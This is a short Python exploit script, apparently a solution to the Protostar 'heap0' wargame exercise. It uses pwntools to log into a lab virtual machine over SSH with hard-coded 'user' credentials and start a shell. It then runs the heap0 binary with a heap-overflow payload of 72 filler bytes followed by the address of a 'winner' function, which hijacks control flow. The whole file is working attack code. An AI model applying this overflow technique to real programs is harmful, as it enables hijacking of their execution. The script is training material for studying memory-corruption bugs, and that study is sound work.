#Exploit code written by RegaledSeer
from pwn import *

WINNER_ADDRESS = 0x08048464
USER_NAME = 'user'
IP_ADDRESS = '192.168.56.102'
PASSWORD = 'user'
FILE_LOCATION = '/opt/protostar/bin/heap0'

def craft_payload():
	payload = ""
	payload += "A"*72
	payload += p32(WINNER_ADDRESS)
	return payload

def main():
	shell = ssh(USER_NAME, IP_ADDRESS, password=PASSWORD)
	sh = shell.run('/bin/sh')
	sh.sendline(FILE_LOCATION + " " + craft_payload())
	while True:
		print(sh.recvline())	

if __name__ == "__main__":
	main()
